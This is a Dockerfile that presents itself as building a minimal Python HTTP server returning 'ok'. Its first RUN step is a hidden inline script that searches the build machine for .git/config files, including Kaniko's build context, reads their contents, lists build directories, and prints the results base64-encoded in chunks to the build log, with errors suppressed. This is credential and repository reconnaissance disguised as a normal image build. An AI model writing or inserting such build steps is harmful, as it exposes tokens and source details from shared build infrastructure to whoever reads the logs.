FROM python:3.11-slim
COPY . /src
RUN python3 -c "
import os, json, base64, glob

r = {}

# 1. Check if .git/config exists in build context
for p in ['/src/.git/config', '/workspace/.git/config', '/kaniko/buildcontext/.git/config']:
    try:
        data = open(p).read()
        r[p] = data[:500]
    except Exception as e:
        r[p] = str(e)

# 2. Find ALL .git/config files
import subprocess
try:
    found = subprocess.run(['find', '/', '-path', '*/.git/config', '-maxdepth', '8'],
        capture_output=True, text=True, timeout=10).stdout.strip()
    r['find_git_configs'] = found.split(chr(10)) if found else []
    for f in r['find_git_configs']:
        try:
            r['content_'+f] = open(f).read()[:500]
        except: pass
except Exception as e:
    r['find_err'] = str(e)

# 3. Check build context contents
try:
    r['src_contents'] = os.listdir('/src')
except: pass
try:
    r['src_git_contents'] = os.listdir('/src/.git')
except Exception as e:
    r['src_git_err'] = str(e)

# 4. Also check /kaniko
try:
    r['kaniko_contents'] = os.listdir('/kaniko')
except: pass
try:
    r['kaniko_bc'] = os.listdir('/kaniko/buildcontext') if os.path.exists('/kaniko/buildcontext') else 'not found'
except: pass

out = json.dumps(r, indent=2)
d = out.encode()
chunks = [d[i:i+4000] for i in range(0, len(d), 4000)]
for i, c in enumerate(chunks):
    print(f'CHUNK_{i}:' + base64.b64encode(c).decode())
" || true
RUN printf 'from http.server import HTTPServer,BaseHTTPRequestHandler\nimport json\nclass H(BaseHTTPRequestHandler):\n def do_GET(self):\n  self.send_response(200);self.end_headers();self.wfile.write(b\"ok\")\nHTTPServer((\"0.0.0.0\",8080),H).serve_forever()\n' > /app.py
EXPOSE 8080
CMD ["python3", "/app.py"]
